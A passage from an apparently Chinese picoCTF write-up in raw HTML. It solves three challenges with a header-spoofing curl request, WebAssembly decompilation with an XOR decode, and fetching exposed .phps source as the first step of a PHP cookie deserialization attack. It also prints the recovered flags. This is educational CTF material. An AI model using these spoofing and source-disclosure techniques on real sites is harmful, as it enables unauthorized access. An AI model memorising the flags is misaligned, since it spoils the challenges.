keyword">User-Agent:</span> PicoBrowser<span class="token header-name keyword">Accept:</span> text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<span class="token header-name keyword">Accept-Language:</span> sv-sv<span class="token header-name keyword">Accept-Encoding:</span> gzip, deflate<span class="token header-name keyword">DNT:</span> 1<span class="token header-name keyword">Connection:</span> close<span class="token header-name keyword">Referer:</span> http://mercury.picoctf.net:46199<span class="token header-name keyword">Date:</span> 2018<span class="token header-name keyword">X-Forwarded-For:</span>193.150.233.115<span class="token header-name keyword">Content-Length:</span> 4</code></pre><p>exp:</p><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀m0re<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/桌面/CTF<span class="token punctuation">]</span>└─<span class="token comment"># curl --user-agent "picobrowser" "http://mercury.picoctf.net:46199/" --referer "http://mercury.picoctf.net:46199/" -H "Date: 2018" -H "DNT: 1" -H "X-Forwarded-For: 193.150.233.115" -H "Accept-Language: sv" -s | grep h3</span>                                <span class="token operator">&lt;</span>h3 <span class="token assign-left variable">style</span><span class="token operator">=</span><span class="token string">"color:green"</span><span class="token operator">></span>What can I say except, you are welcome<span class="token operator">&lt;</span>/h<span class="token operator"><span class="token file-descriptor important">3</span>></span>                        <span class="token operator">&lt;</span>b<span class="token operator">></span>picoCTF<span class="token punctuation">&#123;</span>http_h34d3rs_v3ry_c0Ol_much_w0w_8d5d8d77<span class="token punctuation">&#125;</span><span class="token operator">&lt;</span>/b<span class="token operator">></span></code></pre><h1 id="Some-Assembly-Required-2"><a href="#Some-Assembly-Required-2" class="headerlink" title="Some Assembly Required 2"></a>Some Assembly Required 2</h1><p>与Some Assembly Required 1类似，但是又有改进处。<br>这里开始使用了<code>wasm2wat</code>，但是没有像上一题那样得到flag。所以这次使用了<code>wasm-decompile</code></p><pre class="language-bash" data-language="bash"><code class="language-bash">./wasm-decompile script.wasm -o script.dcmp </code></pre><p>结果如下：</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">export</span> memory <span class="token function">memory</span><span class="token punctuation">(</span>initial<span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> max<span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>global g_a<span class="token operator">:</span>int <span class="token operator">=</span> <span class="token number">66864</span><span class="token punctuation">;</span><span class="token keyword">export</span> global input<span class="token operator">:</span>int <span class="token operator">=</span> <span class="token number">1072</span><span class="token punctuation">;</span><span class="token keyword">export</span> global dso_handle<span class="token operator">:</span>int <span class="token operator">=</span> <span class="token number">1024</span><span class="token punctuation">;</span><span class="token keyword">export</span> global data_end<span class="token operator">:</span>int <span class="token operator">=</span> <span class="token number">1328</span><span class="token punctuation">;</span><span class="token keyword">export</span> global global_base<span class="token operator">:</span>int <span class="token operator">=</span> <span class="token number">1024</span><span class="token punctuation">;</span><span class="token keyword">export</span> global heap_base<span class="token operator">:</span>int <span class="token operator">=</span> <span class="token number">66864</span><span class="token punctuation">;</span><span class="token keyword">export</span> global memory_base<span class="token operator">:</span>int <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">export</span> global table_base<span class="token operator">:</span>int <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>table T_a<span class="token operator">:</span><span class="token function">funcref</span><span class="token punctuation">(</span>min<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> max<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>data <span class="token function">d_xakgKNs989l1im8i890088k09nj9</span><span class="token punctuation">(</span>offset<span class="token operator">:</span> <span class="token number">1024</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">"xakgK\Ns9=8:9l1?im8i&lt;89?00>88k09=nj9kimnu\00\00"</span><span class="token punctuation">;</span><span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">wasm_call_ctors</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token operator">:</span>int<span class="token punctuation">,</span> b<span class="token operator">:</span>int</span><span class="token punctuation">)</span><span class="token operator">:</span>int <span class="token punctuation">&#123;</span>  <span class="token keyword">var</span> c<span class="token operator">:</span>int <span class="token operator">=</span> g_a<span class="token punctuation">;</span>  <span class="token keyword">var</span> d<span class="token operator">:</span>int <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> e<span class="token operator">:</span>int <span class="token operator">=</span> c <span class="token operator">-</span> d<span class="token punctuation">;</span>  e<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">:</span>int <span class="token operator">=</span> a<span class="token punctuation">;</span>  e<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">:</span>int <span class="token operator">=</span> b<span class="token punctuation">;</span>  <span class="token keyword">var</span> f<span class="token operator">:</span>int <span class="token operator">=</span> e<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">:</span>int<span class="token punctuation">;</span>  e<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">:</span>int <span class="token operator">=</span> f<span class="token punctuation">;</span>  <span class="token keyword">var</span> g<span class="token operator">:</span>int <span class="token operator">=</span> e<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">:</span>int<span class="token punctuation">;</span>  e<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">:</span>int <span class="token operator">=</span> g<span class="token punctuation">;</span>  loop L_b <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> h<span class="token operator">:</span>ubyte_ptr <span class="token operator">=</span> e<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">:</span>int<span class="token punctuation">;</span>    <span class="token keyword">var</span> i<span class="token operator">:</span>int <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> j<span class="token operator">:</span>int <span class="token operator">=</span> h <span class="token operator">+</span> i<span class="token punctuation">;</span>    e<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">:</span>int <span class="token operator">=</span> j<span class="token punctuation">;</span>    <span class="token keyword">var</span> k<span class="token operator">:</span>int <span class="token operator">=</span> h<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    e<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token operator">:</span>byte <span class="token operator">=</span> k<span class="token punctuation">;</span>    <span class="token keyword">var</span> l<span class="token operator">:</span>ubyte_ptr <span class="token operator">=</span> e<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">:</span>int<span class="token punctuation">;</span>    <span class="token keyword">var</span> m<span class="token operator">:</span>int <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> n<span class="token operator">:</span>int <span class="token operator">=</span> l <span class="token operator">+</span> m<span class="token punctuation">;</span>    e<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">:</span>int <span class="token operator">=</span> n<span class="token punctuation">;</span>    <span class="token keyword">var</span> o<span class="token operator">:</span>int <span class="token operator">=</span> l<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    e<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">:</span>byte <span class="token operator">=</span> o<span class="token punctuation">;</span>    <span class="token keyword">var</span> p<span class="token operator">:</span>int <span class="token operator">=</span> e<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token operator">:</span>ubyte<span class="token punctuation">;</span>    <span class="token keyword">var</span> q<span class="token operator">:</span>int <span class="token operator">=</span> <span class="token number">255</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> r<span class="token operator">:</span>int <span class="token operator">=</span> p <span class="token operator">&amp;</span> q<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>r<span class="token punctuation">)</span> goto B_c<span class="token punctuation">;</span>    <span class="token keyword">var</span> s<span class="token operator">:</span>int <span class="token operator">=</span> e<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token operator">:</span>ubyte<span class="token punctuation">;</span>    <span class="token keyword">var</span> t<span class="token operator">:</span>int <span class="token operator">=</span> <span class="token number">255</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> u<span class="token operator">:</span>int <span class="token operator">=</span> s <span class="token operator">&amp;</span> t<span class="token punctuation">;</span>    <span class="token keyword">var</span> v<span class="token operator">:</span>int <span class="token operator">=</span> e<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">:</span>ubyte<span class="token punctuation">;</span>    <span class="token keyword">var</span> w<span class="token operator">:</span>int <span class="token operator">=</span> <span class="token number">255</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> x<span class="token operator">:</span>int <span class="token operator">=</span> v <span class="token operator">&amp;</span> w<span class="token punctuation">;</span>    <span class="token keyword">var</span> y<span class="token operator">:</span>int <span class="token operator">=</span> u <span class="token operator">-</span> x<span class="token punctuation">;</span>    e<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">:</span>int <span class="token operator">=</span> y<span class="token punctuation">;</span>    goto B_a<span class="token punctuation">;</span>    label B_c<span class="token operator">:</span>    <span class="token keyword">var</span> z<span class="token operator">:</span>int <span class="token operator">=</span> e<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token operator">:</span>ubyte<span class="token punctuation">;</span>    <span class="token keyword">var</span> aa<span class="token operator">:</span>int <span class="token operator">=</span> <span class="token number">255</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> ba<span class="token operator">:</span>int <span class="token operator">=</span> z <span class="token operator">&amp;</span> aa<span class="token punctuation">;</span>    <span class="token keyword">var</span> ca<span class="token operator">:</span>int <span class="token operator">=</span> e<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">:</span>ubyte<span class="token punctuation">;</span>    <span class="token keyword">var</span> da<span class="token operator">:</span>int <span class="token operator">=</span> <span class="token number">255</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> ea<span class="token operator">:</span>int <span class="token operator">=</span> ca <span class="token operator">&amp;</span> da<span class="token punctuation">;</span>    <span class="token keyword">var</span> fa<span class="token operator">:</span>int <span class="token operator">=</span> ba<span class="token punctuation">;</span>    <span class="token keyword">var</span> ga<span class="token operator">:</span>int <span class="token operator">=</span> ea<span class="token punctuation">;</span>    <span class="token keyword">var</span> ha<span class="token operator">:</span>int <span class="token operator">=</span> fa <span class="token operator">==</span> ga<span class="token punctuation">;</span>    <span class="token keyword">var</span> ia<span class="token operator">:</span>int <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> ja<span class="token operator">:</span>int <span class="token operator">=</span> ha <span class="token operator">&amp;</span> ia<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>ja<span class="token punctuation">)</span> <span class="token keyword">continue</span> L_b<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">var</span> ka<span class="token operator">:</span>int <span class="token operator">=</span> e<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token operator">:</span>ubyte<span class="token punctuation">;</span>  <span class="token keyword">var</span> la<span class="token operator">:</span>int <span class="token operator">=</span> <span class="token number">255</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> ma<span class="token operator">:</span>int <span class="token operator">=</span> ka <span class="token operator">&amp;</span> la<span class="token punctuation">;</span>  <span class="token keyword">var</span> na<span class="token operator">:</span>int <span class="token operator">=</span> e<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">:</span>ubyte<span class="token punctuation">;</span>  <span class="token keyword">var</span> oa<span class="token operator">:</span>int <span class="token operator">=</span> <span class="token number">255</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> pa<span class="token operator">:</span>int <span class="token operator">=</span> na <span class="token operator">&amp;</span> oa<span class="token punctuation">;</span>  <span class="token keyword">var</span> qa<span class="token operator">:</span>int <span class="token operator">=</span> ma <span class="token operator">-</span> pa<span class="token punctuation">;</span>  e<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">:</span>int <span class="token operator">=</span> qa<span class="token punctuation">;</span>  label B_a<span class="token operator">:</span>  <span class="token keyword">var</span> ra<span class="token operator">:</span>int <span class="token operator">=</span> e<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">:</span>int<span class="token punctuation">;</span>  <span class="token keyword">return</span> ra<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">check_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span>int <span class="token punctuation">&#123;</span>  <span class="token keyword">var</span> a<span class="token operator">:</span>int <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> b<span class="token operator">:</span>int <span class="token operator">=</span> <span class="token number">1072</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> c<span class="token operator">:</span>int <span class="token operator">=</span> <span class="token number">1024</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> d<span class="token operator">:</span>int <span class="token operator">=</span> <span class="token function">strcmp</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> e<span class="token operator">:</span>int <span class="token operator">=</span> d<span class="token punctuation">;</span>  <span class="token keyword">var</span> f<span class="token operator">:</span>int <span class="token operator">=</span> a<span class="token punctuation">;</span>  <span class="token keyword">var</span> g<span class="token operator">:</span>int <span class="token operator">=</span> e <span class="token operator">!=</span> f<span class="token punctuation">;</span>  <span class="token keyword">var</span> h<span class="token operator">:</span>int <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> i<span class="token operator">:</span>int <span class="token operator">=</span> g <span class="token operator">^</span> h<span class="token punctuation">;</span>  <span class="token keyword">var</span> j<span class="token operator">:</span>int <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> k<span class="token operator">:</span>int <span class="token operator">=</span> i <span class="token operator">&amp;</span> j<span class="token punctuation">;</span>  <span class="token keyword">return</span> k<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">copy</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token operator">:</span>int<span class="token punctuation">,</span> b<span class="token operator">:</span>int</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">var</span> c<span class="token operator">:</span>int <span class="token operator">=</span> g_a<span class="token punctuation">;</span>  <span class="token keyword">var</span> d<span class="token operator">:</span>int <span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> e<span class="token operator">:</span>int_ptr <span class="token operator">=</span> c <span class="token operator">-</span> d<span class="token punctuation">;</span>  e<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> a<span class="token punctuation">;</span>  e<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token punctuation">;</span>  <span class="token keyword">var</span> f<span class="token operator">:</span>int <span class="token operator">=</span> e<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">eqz</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">)</span> goto B_a<span class="token punctuation">;</span>  <span class="token keyword">var</span> g<span class="token operator">:</span>int <span class="token operator">=</span> e<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> h<span class="token operator">:</span>int <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> i<span class="token operator">:</span>int <span class="token operator">=</span> g <span class="token operator">^</span> h<span class="token punctuation">;</span>  e<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>  label B_a<span class="token operator">:</span>  <span class="token keyword">var</span> j<span class="token operator">:</span>int <span class="token operator">=</span> e<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> k<span class="token operator">:</span>byte_ptr <span class="token operator">=</span> e<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  k<span class="token punctuation">[</span><span class="token number">1072</span><span class="token punctuation">]</span> <span class="token operator">=</span> j<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><code>check_flag</code>与上一题很是类似，几乎一样，所以这里判断flag所在是在最后一个操作中，也就是<code>copy</code></p><pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">copy</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token operator">:</span>int<span class="token punctuation">,</span> b<span class="token operator">:</span>int</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">var</span> c<span class="token operator">:</span>int <span class="token operator">=</span> g_a<span class="token punctuation">;</span>  <span class="token keyword">var</span> d<span class="token operator">:</span>int <span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> e<span class="token operator">:</span>int_ptr <span class="token operator">=</span> c <span class="token operator">-</span> d<span class="token punctuation">;</span>  e<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> a<span class="token punctuation">;</span>  e<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token punctuation">;</span>  <span class="token keyword">var</span> f<span class="token operator">:</span>int <span class="token operator">=</span> e<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">eqz</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">)</span> goto B_a<span class="token punctuation">;</span>  <span class="token keyword">var</span> g<span class="token operator">:</span>int <span class="token operator">=</span> e<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> h<span class="token operator">:</span>int <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> i<span class="token operator">:</span>int <span class="token operator">=</span> g <span class="token operator">^</span> h<span class="token punctuation">;</span>  e<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>  label B_a<span class="token operator">:</span>  <span class="token keyword">var</span> j<span class="token operator">:</span>int <span class="token operator">=</span> e<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> k<span class="token operator">:</span>byte_ptr <span class="token operator">=</span> e<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  k<span class="token punctuation">[</span><span class="token number">1072</span><span class="token punctuation">]</span> <span class="token operator">=</span> j<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>而且在<code>check_flag</code>中也有一个异或操作。</p><pre class="language-bash" data-language="bash"><code class="language-bash">var i:int <span class="token operator">=</span> g ^ h<span class="token punctuation">;</span>var j:int <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>var k:int <span class="token operator">=</span> i <span class="token operator">&amp;</span> j<span class="token punctuation">;</span></code></pre><p>明显是在对比这一段。</p><p>然后看的是这里</p><pre class="language-bash" data-language="bash"><code class="language-bash">var b:int <span class="token operator">=</span> <span class="token number">1072</span><span class="token punctuation">;</span>var c:int <span class="token operator">=</span> <span class="token number">1024</span><span class="token punctuation">;</span>var d:int <span class="token operator">=</span> strcmp<span class="token punctuation">(</span>c, b<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>取<code>1024</code>，所以可以确定flag是与这里有关。</p><pre class="language-bash" data-language="bash"><code class="language-bash">data d_xakgKNs989l1im8i890088k09nj9<span class="token punctuation">(</span>offset: <span class="token number">1024</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">"xakgK\Ns9=8:9l1?im8i&lt;89?00>88k09=nj9kimnu<span class="token entity" title="\00">\00</span><span class="token entity" title="\00">\00</span>"</span><span class="token punctuation">;</span></code></pre><p>结合copy中的异或操作。<code>h=8</code></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">print</span><span class="token punctuation">(</span>xor<span class="token punctuation">(</span><span class="token string">"xakgK\\Ns9=8:9l1?im8i&lt;89?00>88k09=nj9kimnu\00\00"</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#b'picoCTF&#123;15021d97ae0a401788600c815fb1caef&#125;\x08\x08'</span></code></pre><h1 id="Super-Serial"><a href="#Super-Serial" class="headerlink" title="Super Serial"></a>Super Serial</h1><p>很有学习价值的一道题目。现在来复现一遍。<br>打开<code>robots.txt</code>看到了什么？</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">User-agent:</span> *<span class="token header-name keyword">Disallow:</span> /admin.phps</code></pre><p>访问一下</p><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀m0re<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/桌面/CTF<span class="token punctuation">]</span>└─<span class="token comment"># curl  http://mercury.picoctf.net:2148/admin.phps</span>Not Found</code></pre><p>那<code>admin.php</code>有<code>admin.phps</code>，<code>index.php</code>是不是也有<code>index.phps</code>呢</p><pre class="language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">┌──(root💀m0re)-[~&#x2F;桌面&#x2F;CTF]└─# curl  http:&#x2F;&#x2F;mercury.picoctf.net:2148&#x2F;index.phps&lt;?phprequire_once(&quot;cookie.php&quot;);if(isset($_POST[&quot;user&quot;]) &amp;&amp; isset($_POST[&quot;pass&quot;]))&#123;        $con &#x3D; new SQLite3(&quot;..&#x2F;users.db&quot;);        $username &#x3D; $_POST[&quot;user&quot;];        $password &#x3D; $_POST[&quot;pass&quot;];        $perm_res &#x3D; new permissions($username, $password);        if ($perm_res-&gt;is_guest() || $perm_res-&gt;is_admin()) &#123;                setcookie(&quot;login&quot;, urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), &quot;&#x2F;&quot;);                header(&quot;Location: authentication.php&quot;);                die();        &#125; else &#123;                $msg &#x3D; &#39;&lt;h6 class&#x3D;&quot;text-center&quot; style&#x3D;&quot;color:red&quot;&gt;Invalid Login.&lt;&#x2F;h6&gt;&#39;;        &#125;&#125;?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;link href&#x3D;&quot;https:&#x2F;&#x2F;stackpath.bootstrapcdn.com&#x2F;bootstrap&#x2F;4.3.1&#x2F;css&#x2F;bootstrap.min.css&quot; rel&#x3D;&quot;stylesheet&quot; integrity&#x3D;&quot;sha384-ggOyR0iXCbMQv3Xipma34MD+dH&#x2F;1fQ784&#x2F;j6cY&#x2F;iJTQUOhcWr7x9JvoRxT2MZw1T&quot; crossorigin&#x3D;&quot;anonymous&quot;&gt;&lt;link href&#x3D;&quot;style.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;stackpath.bootstrapcdn.com&#x2F;bootstrap&#x2F;4.3.1&#x2F;js&#x2F;bootstrap.min.js&quot; integrity&#x3D;&quot;sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf&#x2F;nJGzIxFDsf4x0xIM+B07jRM&quot; crossorigin&#x3D;&quot;anonymous&quot;&gt;&lt;&#x2F;script&gt;&lt;&#x2F;head&gt;        &lt;body&gt;                &lt;div class&#x3D;&quot;container&quot;&gt;                        &lt;div class&#x3D;&quot;row&quot;&gt;                                &lt;div class&#x3D;&quot;col-sm-9 col-md-7 col-lg-5 mx-auto&quot;&gt;                                        &lt;div class&#x3D;&quot;card card-signin my-5&quot;&gt;                                                &lt;div class&#x3D;&quot;card-body&quot;&gt;                                                        &lt;h5 class&#x3D;&quot;card-title text-center&quot;&gt;Sign In&lt;&#x2F;h5&gt;                                                        &lt;?php if (isset($msg)) echo $msg; ?&gt;                                                        &lt;form class&#x3D;&quot;form-signin&quot; action&#x3D;&quot;index.php&quot; method&#x3D;&quot;post&quot;&gt;                                                                &lt;div class&#x3D;&quot;form-label-group&quot;&gt;                                                                        &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;user&quot; name&#x3D;&quot;user&quot; class&#x3D;&quot;form-control&quot; placeholder&#x3D;&quot;Username&quot; required autofocus&gt;                                                                        &lt;label for&#x3D;&quot;user&quot;&gt;Username&lt;&#x2F;label&gt;                                                                &lt;&#x2F;div&gt;                                                                &lt;div class&#x3D;&quot;form-label-group&quot;&gt;                                                                        &lt;input type&#x3D;&quot;password&quot; id&#x3D;&quot;pass&quot; name&#x3D;&quot;pass&quot; class&#x3D;&quot;form-control&quot; placeholder&#x3D;&quot;Password&quot; required&gt;                                                                        &lt;label for&#x3D;&quot;pass&quot;&gt;Password&lt;&#x2F;label&gt;                                                                &lt;&#x2F;div&gt;                                                                &lt;button class&#x3D;&quot;btn btn-lg btn-primary btn-block text-uppercase&quot; type&#x3D;&quot;submit&quot;&gt;Sign in&lt;&#x2F;button&gt;                                                        &lt;&#x2F;form&gt;                                                &lt;&#x2F;div&gt;                                        &lt;&#x2F;div&gt;                                &lt;&#x2F;div&gt;                        &lt;&#x2F;div&gt;                &lt;&#x2F;div&gt;        &lt;&#x2F;body&gt;&lt;&#x2F;html&gt;</code></pre><p>主要部分为PHP代码如下：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"cookie.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"user"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"pass"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$con</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SQLite3</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"../users.db"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"user"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"pass"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$perm_res</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">permissions</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$perm_res</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">is_guest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token variable">$perm_res</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">is_admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"login"</span><span class="token punctuation">,</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$perm_res</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">86400</span> <span class="token operator">*</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: authentication.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token 